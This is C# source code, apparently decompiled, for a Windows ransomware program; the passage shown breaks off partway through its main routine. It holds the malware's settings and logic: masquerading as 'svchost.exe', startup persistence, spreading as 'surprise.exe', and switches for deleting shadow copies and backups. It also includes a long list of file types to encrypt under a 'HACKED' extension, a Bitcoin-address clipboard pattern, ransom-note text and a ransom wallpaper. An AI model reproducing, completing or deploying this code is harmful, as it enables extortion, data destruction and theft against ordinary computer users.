using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "HACKED";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBwgHBgkIBwgKCgkLDRYPDQwMDRsUFRAWIB0iIiAdHx8kKDQsJCYxJx8fLT0tMTU3Ojo6Iys/RD84QzQ5OjcBCgoKDQwNGg8PGjclHyU3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3N//AABEIAJQA7AMBEQACEQEDEQH/xAAbAAACAwEBAQAAAAAAAAAAAAACAwEEBQAGB//EADsQAAIBAwIEAwYFAgUEAwAAAAECAwAEERIhBRMxQSJRYQYycYGRoRRCscHRI+EVUmJy8CQzQ/EWc4L/xAAaAQADAQEBAQAAAAAAAAAAAAABAgMEAAUG/8QANREAAgIBBAEDAgQEBQUBAAAAAAECEQMEEiExQRMiUQVhFDKhwRVxgfBCYrHR4SMzUpHxgv/aAAwDAQACEQMRAD8A+JahpPh7UBrO1eEjHeuDfARf/T+auDZIbdfD3oBslXwoyp6Vw18HBvCRpPu0Apkhhg5TfNcFV8Ehhr93vXB4JVtwMbigMggBknpsfpQHUV2NGBkhPCyjrQbKpc8LsJmQk61J6dKA9QvlEl0U5Ee2cihyc9i52kmYNsqkb56fH+a6g3FqkgeeugKQ2ykZz8P4o0JvjVMlrhW30sMAUKHeSPdMaZce9Ex1EEdd6BR0u12AWjLHMZG/7UeSclBvoBGAYME1DfbFG+BainwgJCrIFCacA5NFWTkotUlQtmH+U4xTE3QJffOk9c1wlogsAcaT1FcB8cUDq8IGnpRA3wcWAA8P5aIraIZ8g+DFcBsjX18PX+1cCzte2NP5q4F8EI5BGFzjNEVOgkbw9KJwsE4O3auOVhZOCMetBjKwvEc7d6A/ISFtjpO1BseKfwMUvoUBDStjpOuiSrnPh7CutDOD+CRHIM+A/ShuQyxy+BiQOzgBCTnpilcki0NPKTSSHJBpx4CxyRjG9LvLLTqKuhkMLLnmr1Uqo9N6Ep/BXHpmvzokhiI20eFQARnyoX2UUXS44Qi7JeZmQYB7U8ejLnj77iQpbljwnIbNEHhKiw65kUxqWGDk+tTvjk0Shc04q+BJtZGXITcdcHPzpt8fkk9LNq0juRKqktGR6UXOPyd6GRJ3EPnTI6kqfDuAe1LSDvmpLchfMk1FmQEk/tT14Jbpbm6Og5rSABN80HSQccZylVDHRGJDdAOtLudFpYouTTFzI4AyhOVxTJkJ4mkuBciNgkDJBGRjvTKRKeNqPC6AZm1e6OvlREd30Jw/lTWRaddEHVhcjtRFpo4k4O3auA0wSTucURHZ2s7bfmrgWwQxBzjNEXklDt0rhbOWRgrDT1GK4dSaDEjFSNPlvQYyboZzZMe4Pez96FFE5UGJnwo0DY0lFoyargdHcSKFHKBwv1pXE0RyNLoNLh1Rv6Y3TH2I/ehtKxzSS6LEMs8j6I4gSxHy6fxSSSS5L4pznLbFD3MqShVh0zB+metJw1d8GuSlCaW2pB/iTG5l5aljk/Wlq+B1llBbq5K/4tzKMRjowO/nT7FRn/ES3WkKMkkrMRGN1Gwo0kibnOXSGlC2t3VVCsAR5UL8FIwu3LiuDQ4daXF3OFtLMn+pgtpOM46VOVVyzXittqKSryz0Frw824WR7PW5J3kjODjIO3pv9Kg5yo9OOnwu2pFyS8uBZxR8sLGkRjUhcZUgDP0Aob5UVhpcKm35uybrid5Mc3FtGfBpwY8gjVnP1rnkmCOhwJUpfqVOJ8PbiEchj4d+HZmU5jRsbnyx3p1OXdGeWmxOOz1P9DzF/ZS21xy7iAxSF8bqRvjpV02eZkwpNLjn9f5FWNp7Z2YRZzkZxsKa4vyRisuH/DZ0mvRGoiAOnOodwe9cqDOEntil9yZJHLmPlqSBjFChpSlu2UKnEunUFAj2bYU6aM+WGTb17RUySZ1iHChsfami0Z8sJ3ajxdFUl9KgJTmV7vgFi+B4Py0wj3fALO+DlBuK4R38AFzg+D/m1Em7BLnpo/NREbddAq7LjC9M0wlvglWJHu96ItggvgjHbFAKsks5U5HWgOm6C1uV696A6sIM4xvQHtjFeQYwelB0UTkSGkKsue1Dga5UXUSZbdpNIZCRqZeqmpumzdCGSENy6+3aGCe5Lh298eEGkqJdZMj5k+REss+vxE9z86eKVGbJPJupkIskjHc9DXOSQceOc3wPMrQgqm50gE0lX2aXP0eI9li0WS7uAFOqVyMk9qWXCK4k8s+O2ewsxdQcuC1jK/1tgBjL6cdfhWW23R9E8OCEHu+OTO4hxx4m5S3C60JBIGrB3zj6mqxjK+UYtRqcEVUJV/S/76PPXF5cTy/1bmaSMLgajjAxjp8AKulx0eLLI3N+50dFfXEWOVeTL6Ekj6UKXwPGdcxm0ek4T7S30rCGU5csoVx0YjptUpxro9DSZMeXjMv6lq/aW9jeG7Q5MmvfqrBcZ+lSjJ3yenLSYHFJeFweYlS4hkkhOSVYqV7471dUzxJwnjbinaFSBgOZC/bGKKfhiyi178bK7SvnckEU9cGTdTLcV2HyJdztkfDpU5Rfg24s8JcSBlmcuMh23BRT0+FNGyeV1L5+DOlLKAOuOh86sjzMi2uhDM/T0p0Z5NgOz9x2/aiSbYBL74AoknYJZ8b+eaNC26AUvtgedMTthITpoiixqwdu1AKsIatPSgOroMFsdKBRWH4sDalKKwhq8q4fkbEGJJx8c0rLY4tstRc3xHcKCNQHTNTbNmNN2w/6jTaT4WzkD1oeBvdKXPBzLNJIEKjO5JoKlyNKM5yUGGAxBSMAYG7GhfllaaW2AiNJHcLGupjtgd6dtLkzQxzlLbFWz0XAbbkPNKAHmUqu3RTms2SdnvfT9LDHJty58lrjt3dR20jkaWkcL06HT5fClxcsrrpwxadRx9vj+h5hYZWXIXSD5titO5HhRwZJK6JaGXAyAduxzQ3ILwzAKSn8jD5UdyFeOfwcBKh6EHzxXWmLtmuWj1nCbye5s42YFmDFSxG+QMfpWaftlR9HockcuC5Plcf8mb7QrJDcLcFcGXUDjuR1p8fKMX1FxhkTj8GQ87hgyjfuDVlHg8yWdxkmgbhWdeYg6jcCui64YM2NyW+IqJjzNTHocimfRnxtbrY5jK66TqGd12pS8t0o0V3DmIArhRnG9UVGWSk48lVtXlToyuyDq327ftRJuwG1b7f82ok3YB1Y6d6KEd0D4sjamJ8kp7tEUFS+KDDGwxr00GVV0ENeKA6sZ48ClKpMMa8UClMu27tHCylEZSMN579KlJc2bsUnGDi1a/ULLRIQB/7pe2U5xxojnMy6WU6+3xo7eTvV3R5XJea3aK3Qtk3DdD8tx9Kip3Jrwei9OseCLf52VySAUzuOoHem+5nlwtq7ARpLZnCkKWXBI7CmdS7Ixc8MntdM9H7KRTvbTlBtzlyfXAxUcsW2qPV+mSjHHLf8sf7TQ3CRoJDj+rv/ALtO32oQjtZTVbMijtZ546pCIs743NU65MSSyexf+xaPNG4RmOOwI7UaTVkoSnjltsukPkZ8hionpNMhw5U6wMUUxZx9rs0fZzmfhXEaY/q/fT/FDMnY307ZsnYr2m5gWFnUH+q3170cN8ifU9vsaMGeFlxIo8DdPMVdS8HlZMVe6PTChSVAS+0ZG9CVeBsMZx76FyRnm+Dpn706kq5JTxNS9pZSC4lQNhRgjHTrU3NJ0aIYMk42A9nMNDCPKt0z6DNNGaEyaWdppdlKeCWM4bc4z8KrGSZgzYZwfIllk3yO37U1mZxYoh96ZEWmA2sfWmJuxeXyPPtRJOwk1YphAV1YPwoMMbCUNppWVSdBgNjrQKpMYFfApSqTHRRyOwAwT60G0WhCTZZjSQt7uNIycdMVJtUbccG5K0NYOFYMhKnfOP8AnpSqrKStRbaJ4bA012owNIOpqGSVRKaDD6uZX0uWW7qRjK0h6JlV/ekjGltNmfLuySyeFwinGcFpJCC3aqNeDFjaVzl34JtYXuJgoBLegyaDdIbDieWTs9Vwlrrh8bxmzudRZWwsR+X71G3Z6+PYo14Ee0AvOIquLW55ivlg0RG+NvtTRfJDVY1OEfT8FAcNv1jXFtOr5IOYz13yPsaDfPII4/Z7XyVFtbxZFZ7WfAHXlncU7argzQhkU02nwPnS9DYS0uN17xGkjFGrJlyX7E2A1pxKYENbzAZGxiIz9qZbUQcc+Vcl3hM11YxNG9pclteRpiJ7fxQmtz4ZbST9GMlODdgcYe5vhGkVndalZmOYj1PWjBV5F1s3mS2xaox0DjMTbA9c7YNO/kwR3P2PyOUtvGwwSu4pWvJaErex+SJhI0TKffQ0VwzpqUsbXlFVTcnGnJ8W2D3qjSMKlkl+UfI8rw46gdB96RUmaZynKG1la45vKXZVA3G9UikYsrm1ZWYyHqaojI2xTa996JJ2LbVtv3p0RaYGHyMH4USbTOTpTE2CoOD8KDDGxwDaGONs0jLxuhi9Nx9aVl4sbpIUHbHxpS6LlgRzCWiEu2wJwBUpptUnRv0rip3KG4trJGeayIVGMYPbapNM3xyY/dKMaAuWITCsME00USzyqNR6IgDKjSK7Kc4BU10u6Bij7HNOgmYaQAcjc/E0EnY85x20JnJGlR+VetMiGVriK+DY9lUdr+TRjVopZ9m3QuKk0z2Dx3fNIZssNG/1xSnoQlhcbS+TuXeCXd11iTc5/Npzn6UOTlLDs4XFfuKne6UKDMuzHbPTrnt8aVsaCxO6X98FSXmlFYkaNGR6DA/akdmiOy6+5zrcDGpgfD59s1wU8Ywx3hJGRkkdPOupibsXwBy5+cAXAYsM+m38UaYd+PbaRahhuY5wsLLzCzDUT5EZ/anSITyYnH3Lg8d7TQPDxNy2PGisN/Sqx5PG1a/6rlEzpQwKS6idQzmiueCM004z+R76hL7w8dIujV1L+YqOObBww0Ftv2p242Z4RyJOnwCnMOMEHc0XQkVJumysyMYzhT0O5NOjNKL21RXIYdTnaqGPlAkHfb/m1FCPkXIGGMjvTIjJMXhyRj1okWmQinFOSIVG0k5GAM9aVjRixoVwG8QwCM0rZogmPCPp3ddjilbNEU67DKuUHjBB6UhZp7RtpBLKG0IzYG+mlnJItp8c5cxTf8h0aERHc/OkbtmmC9joRhiTlvWn4M9NlwqwtNiNz96l/iN3MdOvuKhRmmRcfmpm+COKNzSJlyZm32ya5dDT5m2anszzP8R8BGShzv6iln0a9Dxm5+GexuvxMVxodwXwhOD8cVKTp0eti9OcLS45FTG4aTSXBJbOrPfT/FK2x4emo3Qpop9I1OOp6H4/3peSinC+EV7mX8PCjXE6qhTKhjvjA2+ldtYk82GDdhJIbhdUE6SADHgPr0+tc00GGTFLmJZFveFjofJyMY+P80Umc8mFdoctrO0iFnXJYDy/Lq/SnUbI+tjUeF/d0HDZ3PPISQa9TDJbbYjPaio8gnnxbOVxweT9qYpBeFpGBOhSP9uKaLpmDVqMo7o/JjrvGiswyrU3TMSp40mO0nMW4J1ACl6svV7X9xEq6ZysjHG3eqLlGbIlHI0+iI8MQYzp3P6V3XZ0ZRb9gqRGGR4jnpjodqZGeS7RV5bH82MCqWZFjb4IMTKGOsbdaKYksbSuwGVyoOodaZEpXQnS5I8QzvTGdpkKrY6jrTkGmAqsR12pWNFMYEcrnO3elLKLaHpGcBmY4LYpWaMceOQmUqEIOxpSrjwi1aNKn/bm0Dr8TSSryjVglOKqE6HR62TUxyf1pH2ao24W3ZWCMOtOzMkzU/DhrGE5OGcA/Q1Dd72etLDF6WD+SsYpIJgV3wfvT3ZkcXjn7RZ1FvF13NETm+TS9nlZr8aWx/TNTy/lN309r1+fhnrXSV5GDyAyeEA/p+9SPYUoRVpcCzC/M0tINWrGfXGf0paH9SFXRzQyADMg3J8/X+DXUcskH4PK8ZEv49udnAUaP9uBjH1q8OjxNZbzSsPggmF6Fhzgjx46Y9fnXT6G0NrMvg9nb2V34nSddyo3PrU4qR6OTPiaraJlguIpiWny2vG2f8mf0rnaHjlxyjSj/djYobqWULFMNYLDqdztn9aPLElkxRTco/B5b2likS4kEjZYop69NqMfzGPVOMsbcTEMY5Zc9QfrVb5o8zYvT3B2peSeGInbWAKElSbHwSlPJDG+rI4nGUuiAc7CjidxsGvio5uALWPMTt5MMfejMlp48N/35DFu0mo/iEQgZIY9vSu3V4D6Tm296RnOpGrDZqyPNkmmwCjsCQds70bRJxbFuki9fOnRGUWheCSMHvRJNOwVBwd+9OQaZyLsfF28qVlIIcqYQnUcfClZoj0OA2wWOM+VIy8aDIymxzjzFAtxtDt0Y5Ax0zknpSyKYbsswqxRtxtvtU5GzHe3kNVaRSEQdcZzQfA6uaaiizqK2YgbVrRgDgbbetJt9+7wa1lX4f0X2v8AcCdgrqAD4jnJ9KMVaEzSUZqivKpWV/LqKZdGXJFqbND2dUvf4VsHlmky/lNn05pZ038M9UbeXmaeZl8qM/HpUKPcWSNXXHJa/AOXCczx8zSW9dOc1TaZ/wASttpcV+5Xms7iHSHkyCxCkemf4pJRorDPCadIxPaSHTa28h3J6bdBjOKfGYfqDTSpc2H7LW7SRTaSMqwJPmO1GXZ2hkoQba7PUGxuASPxPcfPf40aYy1GN17RBtnZyDNvq++jOevlQoqs6Ubrx+5EFk4uiiTYYFgTnyIB7+tco8jTzx2W18HlPadWS5IL51qp69BijDs8/WzW10Yzg8hRnxE5x6VTyYX/ANtJdjrCJ/x8edsb0uSXsK6LFL8TH7ciuIBmvXwc+IL86fGqiR1st+odfI1LaW3gxL4Wd9h16A/zQclJ8DxwTwwqaq3/AKJijaySRcxTGw3O593FHciXozmnNVX+hQVdyC3Y9KsebFK7OYDBAY7HPSuQJV4Eup7uevlTohLoVoyQQx79qdGd9kKpx170SICg4Pi7VzGihgzg+LvSll0NBOM6u9KWTD3xjVSlb4GQr4sZz6UGWxcyotxIdLjIHhzgVKRtxppuIxYsE5nwvl9P5pW/sVjBVe6jrbxGSLVnJ6mhP5Dp2nuhfYc6BoF0sxkBOryAroupD5YqWNU+UKcEorlskjB9MUy44JSTcVP+hf8AZ1Nd/jOP6ZpMv5TV9OdZ7+zPVGArL/3RsV3+NZ/J7ymnHr5Lq2zM+0+5kAzg/wCXOf2qqRkeVbfy+P3Jn4ezBCbgHxMB1/1b/b70JRtHQ1K59vj/AGMHjXDp5reFYmBONZ1HGBgfzQi9vYurg9QtsF0wuD2M9gkiTsoL7jSc7ZxRlLk7R4pY4NSXk3YrZpZGAuWG43Pxx50UNLJtXMSBavzSPxHR8Z3/AMmc9flRoHqrbe3x+4toGSYjmnOtlyduh69e+aWXDKqalG6+DxntAjnibrnUSAQB8KrB+22eLrLnmaRVxmcRrnAXHTcDvXdKxF78iihjNJDM7xujacA5zvSpJqmX35MeRyxtccFSJOdeKJJAut8s2eneqt7Ynn44+pmW51bLt2H/AKatJrwp3qUK+Dfqm41ct1WULi1lhh1uo0kZ1A7VaMk3R52bBPHDc1x8opY0537VVGDoBiTnejRNsW2ce93piLYvBJA1edMRZC9OtMTBCjB37UGNFB6Rg796UokMCDHvUrKpDAg23oFkh0UZ6hsbdaRstGDLkVuxw4VguOtSckehjwyTUkg5bGRsaB0ON/KgsiQ+TSTbpClRoJ8Meh3pm7RKEZYp/wAi3H77KrZR/wA+Ns1OjdCStpdMVHy+fy5GOgjBI6Z7UXdWiMNnqbJPhl7gcLR8UaN9iEJz5ikyNShZp0MJYtVtl4s9O9vhyvMzgrv8ahSPcWTi6LlvaAnHOxmTB2/05zVYrgz5M1ePH7nXEKxYXnFmJYbDpu2/2+9c6QMeSUudv98FJoiI1dnyShOB5jG33qXZpU+Wq8kyQacf1CcrnPzrqOjkvwXLWwJDN+IVRkDfvvVIxM2XUVxtIuIBGzKspJD6c4/05/tRfB0JuVXH+7K3JLyaWl6MRk+hG9SbL76jaR53i8P4W8knZizMg5Q+I61aL3JR8Hlah7Ms83npf7mdDG0ERnbLahsc7ink7dIy4E8UPVfnoVdZReW7+Jjlv3po8uyOd7YbfLO4a0Yl0yrq5mFG2cetHJbXAujnjjkqauyLk6vdIwxwoHkP/VdE7PPd15KdwcIFzINujHb5VWKMGaXG22II9e1MjMxbAb70xNgMB596Ym0L0jI3okWiU6UwjBC7H4UGGKDC7H40CiQYG3WlZVdBjbTv3pSiY1OxzjahRaMmWYZCynJJIXz6VNo148zcXZaSVmTUzkEbH7VPYbIZ5NW2InAV9pCd8GmiQyunaZe4c6XUJtZTpIzpIqWSO17kejossc+F6effgoyxtFI0cmxGfn/aqxaatHnZYTxzcZFyz4iYGjLpzGTYHPVe4pJY7Rrw6146tW15+xpPxyONtLW0oO3Vx0+lRWD7m9/VtvDgMf2hiGAts+P94z+lN6cvk5/U4r/CLPHosb275/8AsH8V3o/c5fV/8v6kf49FpH/TP0P/AJB/Fd6P3O/i/wDl/UluPRHH/Tv0H/kH8V3o/c7+L/5f1C/+QRhdP4Z9/wDWP4o+k67B/FE3+T9Qf8ejLb20vU/nH8Uvot+Q/wAV/wAn6hjjEZXW1u6jfHjG/wBqX0eeyq+pNxtwMx2lvJZJicDTjB7Dyq3EVR57eTU5JZOkBJE+ksD4EGQPOimhZQnt3eENWyeJxPMvMjIGQBnRn070rmn7Yjw0s4SWbJHcn+hE9rBEObbv/wBzbbcAd8UYzk+JeBcmDDD34n+b9CkqocmQExkYBXqCPKq8+OzF7Le9cfYpThS+VJ0npmqR+5gy05cdfcUy9fhTkGAV670SbAZfXvRJsDTuN/OiSaCQbUwoCqMHftQYYpEhRp6igx0lQYUY60Cio0+A2dve8QWC5JEZUnKnGMVHNNwjaPR+naeGoz7J9U2a9vw3gsl8LFnukmCZ1FhpJxnb5edReTKobz0FpNE9Q9NFStfcx721/B3Rh5mpdIYHzBqsJ747jFnwfhs8sV9FiKwuSDKlvII9gSV88UrlH5NGPBl/Moun9gJIijtEoOS2nBFDt2dkThcKJisrxJEIgmDAkjw+VFyhXLEhizwlcYvj7Fm4ZJ41WWN47gDcEYxUorY7XR6OfJHUwSmqmv7/AFIitJLhS0MLnSOw2ouVMnHC8iuMRMoEUnKlRsDz6imSvlEZyUXsyLj9Q4+HXE3itopHQnC+Hc125eQrTTknKC4ESwvExSVGRh1BFMRlGUXUlQz8Fc4X+hL4hkeHrQ3Ip6GX/wAWQ1ncCQRmGUORnTp3rtyOeHJu27XZMlnNCQJY3jJIxrGK60c8U49qhgtnEXOSNpEGcyBfD9aVvwUWNxW+Kv8A0AMVxKplEbsgzlgNhijSXAj9WdyrhDLSCeVWeONygByVFLJpFcCnJbl0DzzcyJGgdkwMhBuaKhtVglq3mmoJWvsadxazwRlojJHbnGvUvug9xUo0+zfljkhH/pSqL7T/AGKCo91KsVupLMQoUDOlarW3lmHc8r24/wD4vuVJLW4AwtvLr3DALttVN0V5Mc8Oba6i/vwVI7aWbJhjZxjJ0jOKdyUe2Y4YsmX/ALav+QNxaywAc6N0yMjUMUYyUumTy4cmNXOLRXKrvuKoZ2CVXzFcI6B0DIGetMTaJjA00RaBCrg+LtQYUkFhQpIbNAdJUEFXGde+elAdJUa/svHE/FVWSQKpRsnyrPqPycnsfRHt1Vr/AMX+xv2lpwVuLtrvpPxejUVYYQHA6HG+2ahLc8CXg9WLwr6m5Rtz+H10YN+skHGNUnLmkyrIqk4I7D41bGo+lx0ebrJzj9Qbmrkmq+Dc4bZXsl7G95fW8UZlUFWlz4TjoMev2qLljapHpx/iEMnqSffNfsd7RW9rFx63hjuEkjyoMg8s/tRx9OuhNbLdkhOSqT5LHtOqWM1sLK9BDSya8DqAVwfnk/SuxwjTXZb6hq9Tvg728Fb2kgiNvaTJMquVbIPx6fb70uHhtB+qQ37Zvhrz88JmlHDDfcNRLG+jt5EhR/8A9bAqfLqT8qH5ZuykcmTNp4rE6fmvgx+IKz8Wgg4gqKQyIzruGGdzVY12mYc85TmlkRre0qwWl1bpYXi8oyEas9RhD+pNTik7fZuz58qjC3tfwJ9r7e3t7aB4blJHMpUgb+HxY/QfWmxxjyZvqGfI1ByVf/AuOvyOEWr29yvNkC69IwQdIOPqSPlXRUd1GjU58scHHHww7/EXs9BcRXZE8kKM/h3ViRkUEkp0gz1GaWnUnw+OQ7ixt7n2W59xfxGYRK2knctRi1ubRDNlyZdNGE1/+itZxW49mmBc6/EB5Y8/rSSl7i2BSWk2rlU+f6juC29k/AJZbi7VTouPD3yMaR896aa965I6bUZPw80o2vkq8CMLcNnYzDPiOgHyFLlT3It9PyOWGe1cGLwhLgrNDZctndQDKTp0DNaJqLacjydB69OOn/M135R6rhfDhA0kN9fxyLzIgCkmonUSHJ222A+tQntq+j2NPLURuL9yp992v2MjgcFqvFrrXMDHr04BwQuv+KbM/YjL9OUo6mbi7dP+hUvuMCO5kiSJMKxUszEk12PTppSF1X1nJiyTxQSpcFy3tIk9nIWs7hEuXhLEk7asj9s0s6ef3dFNJ60fpqjgpPjn+vP6EXVrCvApku7qKS5WFm8LZ8W5Hz2FNBJZbj0T1OSb+myhnacl9zyDKu/i6f2rcfKtLuwSiY97vXCNIAKCR4vOmEolANNEUABcH4UDkkSApXJO9cPwN8HX1pR1RpcAks4OIo96xSDSwYj4bfcVHNFyjSPS+m58enz75OlTRctrjhw9oRcSyH8LgksM7HT/ADSbJejtNUNXi/iL1CfH/Au/urb/ABeO6ti0qqis2597Bz1rowax7Ds+rg9f+JXKRpyvwW4u4rt72ROURpi5Z36d+3f6VKEJxg4UbNRqNPnzw1LlyvFCeKXFlc8YtuRI34VMa3UEkDOTRxQcINMXXalajPCUXf8AwXuPXHCbua2/CSyyRK7gysCMrldOx79aEIuCaH1OojqHCU+vt8ivaGaxuLeyFoxdlVjIN8ZycfDYDajj4H1ub1kr5Sf7f7jLR+CtLFcrLcWJihQNFpJ1Pkat/Xei14YmGcFtnbTV8dFHjfELafiSyWAlaGIKF5o98g5PyowxpIhqtdLLk310X7q64JxOS3aaeW2SN8sukkhdIyPqKWEHC6NOp1GLUxhKUqaF+0F3wq85cdjJIVRmLSHYHqBj5YoQg4N15Oz6iGpilN9D+Ny8JuOFWQtLppLgKpmTQcA6AdvmTQUNrtDT1HrQ2y6XX6h8Sn4S/BLeCC6drgQx610EeLOCPpXKNSs7JqXPF6cnwMN77Oj2XEDXEzX3KUcsBsas7+mKf0135M34yexY3+X9Sna3/DG4P+FeZoHZ2DMVJIU5PT40jxvdZrjq8HovHupMmwPCUt2szftpcuplZT3wAcY+NGSk5KTDhz4YaaWFSu/NfIh5+FcP4O1taTTz3cpbmSFSiqCNsDvTyW9pmXHmWmxzwwfD8kcEu+GWXOW7Eo5gUxuozpIIzn5Z+dLkg5h0mqjpXSfD74L1rJ7O2V3PJFeSOGnQ5cMMJqOoeu3f1pZwlNLgfTanFp5ye7lpmZw2/wCGji1xPM5it3k8IXO6l9/tT5MUpRSIaPX4sWolkfFr9TF4k8Et7NJCSys5IOeoq+NNRSZ5WsnDJnnOPNs0bW74fLwj8HdPJFIEI1Y2J6r96lPHJZN8Uelh1uHJovwuaW3xf9bE3MfBLSwmEM73l1KAEOgqI+uT69qrF5G02qR52SOlxY5RjLdJ/br7mOeWcmrGHgEiMfWuEe0EaNs7edEXgJAuOtEUWNOD8KByonw4OetcHgnKgfCgPaDUoSK6g2MVlwCTuRvvStFFM7nY3zQ2jes1wELg7gmu2odZ5LgIXBDYz86G1DfiJfIyO6B0hjnSCMdvSlcCsNVLz4Gx3T4wHyNJO/Y0rgi8NVk+eA2lVlHLf3gMg+dDbRR5XJe19iy6o7AtqG2KarRLftk0AWGNn74NFIm5ebBkfSdJbY0UgSk1w2RzcAYbt9K7aJ6sq7GxkPE7FtxSvh0XhLdBv4LDPDmLTJljjOe1LT5LyyRuNMrSvmVjnboT8qZJUZsk5b3yGJlONTAYJ3xQ2lPX6sGSZSuF3OPFRUSc898dgPMoGzHoN/Wm2iSzcci2l1HOrbIopEpZHLlsBiB0O3lREbXVgF1x60aJbyCy4G9GgOSBYqfhRFbBym9cLaJwh6dc0QcA4XIzXA4CTGOlEB2gaSfSlsdRVEhF5bHvmusO1USY1wdu9dZziqJCLldu+KFhpIlI1IXr0rrDGKOKA5/2g1w21EqgIJ9f4rrOUUEFGvp3oDE6F2OOuquDR0e2RjPhNBjQbVocqAsM9lBFK+ii+fgYYV5mN8EqfrQHkqnQ0WsZm0+LAbz9M0HIqscWFPbRgg4PvEfr/FKmyuTHGrK8kaCIEKMlSfsP5pk+TPOKURjQInhXOG2Ndd8jJUtvyNW2jBHvdu9BSbKrFFcleaFEZiM+9j7U6M84pSAjhR3OrPc11ixgmzpFUIrAAEqc1yOnwrQiRFGw8hTohNHctckY/MP1rgV4BCAfUVwdquwNAwPWiS2qjig2+FdYdiJ0Lvt2/aiBxRDRr4vT+1cJtRHLXHT81dZ21UAqKcbedEVRQSKMfOiKz//Z";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_me.txt";

	private static bool checkAdminPrivilage = false;

	private static bool checkdeleteShadowCopies = false;

	private static bool checkdisableRecoveryMode = false;

	private static bool checkdeleteBackupCatalog = false;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[3] { "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.call this number to dycrypt it" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
